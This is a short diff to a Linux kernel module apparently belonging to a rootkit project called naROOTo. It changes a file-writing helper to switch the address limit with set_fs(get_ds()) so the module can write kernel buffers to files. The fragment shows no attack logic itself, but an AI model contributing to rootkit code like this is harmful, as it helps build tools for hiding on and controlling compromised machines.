@@ -22,6 +22,7 @@
  * along with naROOTo.  If not, see <http://www.gnu.org/licenses/>. 
  */
 
+#include <asm/uaccess.h>
 #include <linux/fdtable.h>
 #include <linux/fs.h>
 #include <linux/sched.h>
@@ -35,9 +36,14 @@
 void
 write_to_file(struct file * fd, char *buf, long len)
 {
+	mm_segment_t old_fs;
+	int ret;
 	loff_t off = 0;
 	if (!IS_ERR (fd)) {
-		vfs_write(fd, buf, len, &off); 
+		old_fs = get_fs();
+		set_fs(get_ds());
+		ret=vfs_write(fd, buf, len, &off);
+		set_fs(old_fs); 
 	} else {
 		ROOTKIT_DEBUG("Some error.");
 	}
